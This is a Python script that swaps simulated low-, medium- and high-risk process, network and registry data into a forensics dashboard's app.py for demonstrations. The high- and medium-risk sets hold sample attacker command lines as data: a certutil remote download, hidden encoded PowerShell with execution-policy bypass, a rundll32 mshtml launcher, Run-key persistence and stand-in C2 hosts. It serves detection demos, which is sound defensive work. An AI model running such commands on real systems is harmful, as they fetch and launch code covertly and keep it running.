#!/usr/bin/env python3
"""
Quick Demo Data Switcher for volLite
Automatically modifies app.py to use different demo scenarios
"""

import os
import json
import shutil
from datetime import datetime

class QuickDemoSwitcher:
    def __init__(self):
        self.app_file = "app.py"
        self.backup_file = f"app_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        
    def create_backup(self):
        """Create backup of current app.py"""
        if os.path.exists(self.app_file):
            shutil.copy2(self.app_file, self.backup_file)
            print(f"✅ Backup created: {self.backup_file}")
            return True
        return False
    
    def switch_to_low_risk(self):
        """Switch to low risk demo data"""
        print("🟢 Switching to LOW RISK demo data...")
        
        demo_data = {
            'processes': [
                {
                    'pid': 4,
                    'name': 'System',
                    'ppid': 0,
                    'path': r'C:\Windows\System32\ntoskrnl.exe',
                    'cmdline': 'System',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1000,
                    'name': 'explorer.exe',
                    'ppid': 4,
                    'path': r'C:\Windows\explorer.exe',
                    'cmdline': 'explorer.exe',
                    'signature_status': 'signed'
                },
                {
                    'pid': 2000,
                    'name': 'chrome.exe',
                    'ppid': 1000,
                    'path': r'C:\Program Files\Google\Chrome\Application\chrome.exe',
                    'cmdline': 'chrome.exe',
                    'signature_status': 'signed'
                }
            ],
            'network': [
                {
                    'remote': '8.8.8.8:53',
                    'protocol': 'UDP'
                },
                {
                    'remote': 'google.com:443',
                    'protocol': 'TCP'
                }
            ],
            'system_info': {
                'registry': [],
                'files': []
            }
        }
        
        return self._update_app_file(demo_data, "Low Risk - Normal System Behavior")
    
    def switch_to_medium_risk(self):
        """Switch to medium risk demo data"""
        print("🟡 Switching to MEDIUM RISK demo data...")
        
        demo_data = {
            'processes': [
                {
                    'pid': 4,
                    'name': 'System',
                    'ppid': 0,
                    'path': r'C:\Windows\System32\ntoskrnl.exe',
                    'cmdline': 'System',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1000,
                    'name': 'explorer.exe',
                    'ppid': 4,
                    'path': r'C:\Windows\explorer.exe',
                    'cmdline': 'explorer.exe',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1234,
                    'name': 'powershell.exe',
                    'ppid': 1000,
                    'path': r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
                    'cmdline': 'powershell.exe -Command Get-Process',
                    'signature_status': 'signed'
                },
                {
                    'pid': 2345,
                    'name': 'certutil.exe',
                    'ppid': 1234,
                    'path': r'C:\Windows\System32\certutil.exe',
                    'cmdline': 'certutil.exe -urlcache -split -f http://example.com/file.exe',
                    'signature_status': 'signed'
                }
            ],
            'network': [
                {
                    'remote': '8.8.8.8:53',
                    'protocol': 'UDP'
                },
                {
                    'remote': 'example.com:80',
                    'protocol': 'TCP'
                },
                {
                    'remote': 'suspicious-site.com:8080',
                    'protocol': 'TCP'
                }
            ],
            'system_info': {
                'registry': [
                    {
                        'key': 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                        'value': 'suspicious.exe',
                        'data': r'C:\Users\Public\suspicious.exe'
                    }
                ],
                'files': [
                    {
                        'path': r'C:\Users\Public\suspicious.exe',
                        'executable': True
                    }
                ]
            }
        }
        
        return self._update_app_file(demo_data, "Medium Risk - Suspicious Activity Detected")
    
    def switch_to_high_risk(self):
        """Switch to high risk demo data"""
        print("🔴 Switching to HIGH RISK demo data...")
        
        demo_data = {
            'processes': [
                {
                    'pid': 4,
                    'name': 'System',
                    'ppid': 0,
                    'path': r'C:\Windows\System32\ntoskrnl.exe',
                    'cmdline': 'System',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1000,
                    'name': 'explorer.exe',
                    'ppid': 4,
                    'path': r'C:\Windows\explorer.exe',
                    'cmdline': 'explorer.exe',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1234,
                    'name': 'powershell.exe',
                    'ppid': 1000,
                    'path': r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
                    'cmdline': 'powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQAwAA== -WindowStyle Hidden -ExecutionPolicy Bypass',
                    'signature_status': 'unsigned'
                },
                {
                    'pid': 2345,
                    'name': 'rundll32.exe',
                    'ppid': 1234,
                    'path': r'C:\Windows\System32\rundll32.exe',
                    'cmdline': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("cmd /c powershell -enc [ENCODED_PAYLOAD]",0,true);',
                    'signature_status': 'signed'
                },
                {
                    'pid': 3456,
                    'name': 'svchost.exe',
                    'ppid': 1234,
                    'path': r'C:\Users\Public\svchost.exe',
                    'cmdline': 'svchost.exe -k netsvcs',
                    'signature_status': 'unsigned'
                }
            ],
            'network': [
                {
                    'remote': '8.8.8.8:53',
                    'protocol': 'UDP'
                },
                {
                    'remote': '203.0.113.1:4444',
                    'protocol': 'TCP'
                },
                {
                    'remote': 'malicious-server.com:8080',
                    'protocol': 'TCP'
                },
                {
                    'remote': 'c2-server.net:1337',
                    'protocol': 'TCP'
                }
            ],
            'system_info': {
                'registry': [
                    {
                        'key': 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                        'value': 'suspicious.exe',
                        'data': r'C:\Users\Public\suspicious.exe'
                    },
                    {
                        'key': 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                        'value': 'persistent.exe',
                        'data': r'C:\Windows\Temp\persistent.exe'
                    }
                ],
                'files': [
                    {
                        'path': r'C:\Users\Public\suspicious.exe',
                        'executable': True
                    },
                    {
                        'path': r'C:\Windows\Temp\persistent.exe',
                        'executable': True
                    }
                ]
            }
        }
        
        return self._update_app_file(demo_data, "High Risk - APT Compromise Detected")
    
    def _update_app_file(self, demo_data, description):
        """Update app.py with new demo data"""
        try:
            # Create backup first
            self.create_backup()
            
            # Read current app.py
            with open(self.app_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Generate the new demo data code
            processes_code = self._generate_processes_code(demo_data['processes'])
            network_code = self._generate_network_code(demo_data['network'])
            system_info_code = self._generate_system_info_code(demo_data['system_info'])
            
            # Replace the demo data sections
            content = self._replace_demo_section(content, 'demo_processes', processes_code)
            content = self._replace_demo_section(content, 'demo_network', network_code)
            content = self._replace_demo_section(content, 'demo_system_info', system_info_code)
            
            # Write updated content
            with open(self.app_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            print(f"✅ Successfully updated app.py with {description}")
            print(f"📊 Demo data summary:")
            print(f"   Processes: {len(demo_data['processes'])}")
            print(f"   Network connections: {len(demo_data['network'])}")
            print(f"   Registry entries: {len(demo_data['system_info']['registry'])}")
            print(f"   Suspicious files: {len(demo_data['system_info']['files'])}")
            
            return True
            
        except Exception as e:
            print(f"❌ Error updating app.py: {e}")
            return False
    
    def _generate_processes_code(self, processes):
        """Generate Python code for processes list"""
        lines = ["demo_processes = ["]
        for i, proc in enumerate(processes):
            lines.append("    {")
            for key, value in proc.items():
                if isinstance(value, str):
                    # Check if it's a Windows path and use raw string
                    if key in ['path', 'cmdline'] and ('C:\\' in value or '\\' in value):
                        lines.append(f"        '{key}': r'{value}',")
                    else:
                        lines.append(f"        '{key}': '{value}',")
                else:
                    lines.append(f"        '{key}': {value},")
            lines.append("    }" + ("," if i < len(processes) - 1 else ""))
        lines.append("]")
        return "\n".join(lines)
    
    def _generate_network_code(self, network):
        """Generate Python code for network list"""
        lines = ["demo_network = ["]
        for i, conn in enumerate(network):
            lines.append("    {")
            for key, value in conn.items():
                lines.append(f"        '{key}': '{value}',")
            lines.append("    }" + ("," if i < len(network) - 1 else ""))
        lines.append("]")
        return "\n".join(lines)
    
    def _generate_system_info_code(self, system_info):
        """Generate Python code for system info"""
        lines = ["demo_system_info = {"]
        
        # Registry
        lines.append("    'registry': [")
        for i, reg in enumerate(system_info['registry']):
            lines.append("        {")
            for key, value in reg.items():
                # Check if it's a Windows path and use raw string
                if key in ['key', 'data'] and ('C:\\' in value or '\\' in value):
                    lines.append(f"            '{key}': r'{value}',")
                else:
                    lines.append(f"            '{key}': '{value}',")
            lines.append("        }" + ("," if i < len(system_info['registry']) - 1 else ""))
        lines.append("    ],")
        
        # Files
        lines.append("    'files': [")
        for i, file_info in enumerate(system_info['files']):
            lines.append("        {")
            for key, value in file_info.items():
                if isinstance(value, str):
                    # Check if it's a Windows path and use raw string
                    if key == 'path' and ('C:\\' in value or '\\' in value):
                        lines.append(f"            '{key}': r'{value}',")
                    else:
                        lines.append(f"            '{key}': '{value}',")
                else:
                    lines.append(f"            '{key}': {value},")
            lines.append("        }" + ("," if i < len(system_info['files']) - 1 else ""))
        lines.append("    ]")
        
        lines.append("}")
        return "\n".join(lines)
    
    def _replace_demo_section(self, content, section_name, new_code):
        """Replace a demo data section in the content"""
        # Find the start and end of the section
        if section_name == 'demo_system_info':
            start_pattern = f"{section_name} = {{"
            end_pattern = "}"
            open_char = '{'
            close_char = '}'
        else:
            start_pattern = f"{section_name} = ["
            end_pattern = "]"
            open_char = '['
            close_char = ']'
        
        start_idx = content.find(start_pattern)
        if start_idx == -1:
            print(f"⚠️ Could not find {section_name} section")
            return content
        
        # Find the matching closing bracket/brace
        bracket_count = 0
        end_idx = start_idx
        for i, char in enumerate(content[start_idx:], start_idx):
            if char == open_char:
                bracket_count += 1
            elif char == close_char:
                bracket_count -= 1
                if bracket_count == 0:
                    end_idx = i + 1
                    break
        
        # Replace the section
        new_content = content[:start_idx] + new_code + content[end_idx:]
        return new_content
    
    def restore_backup(self):
        """Restore from backup"""
        if os.path.exists(self.backup_file):
            shutil.copy2(self.backup_file, self.app_file)
            print(f"✅ Restored app.py from backup: {self.backup_file}")
            return True
        else:
            print(f"❌ No backup file found: {self.backup_file}")
            return False

def main():
    """Main function"""
    switcher = QuickDemoSwitcher()
    
    print("🎯 volLite Quick Demo Data Switcher")
    print("=" * 40)
    print("This script will modify your app.py file to use different demo scenarios.")
    print("A backup will be created automatically.")
    print()
    
    print("Available scenarios:")
    print("1. 🟢 Low Risk - Normal system behavior")
    print("2. 🟡 Medium Risk - Some suspicious activity") 
    print("3. 🔴 High Risk - APT compromise simulation")
    print("4. 🔄 Restore from backup")
    print()
    
    choice = input("Enter your choice (1-4): ").strip()
    
    if choice == '1':
        switcher.switch_to_low_risk()
    elif choice == '2':
        switcher.switch_to_medium_risk()
    elif choice == '3':
        switcher.switch_to_high_risk()
    elif choice == '4':
        switcher.restore_backup()
    else:
        print("❌ Invalid choice. Please run the script again.")
        return
    
    print()
    print("🚀 Next steps:")
    print("1. Restart your Flask application: python app.py")
    print("2. Go to your dashboard")
    print("3. Click 'Use Demo Data' to see the new scenario")
    print("4. Check the risk score and alerts!")

if __name__ == '__main__':
    main()
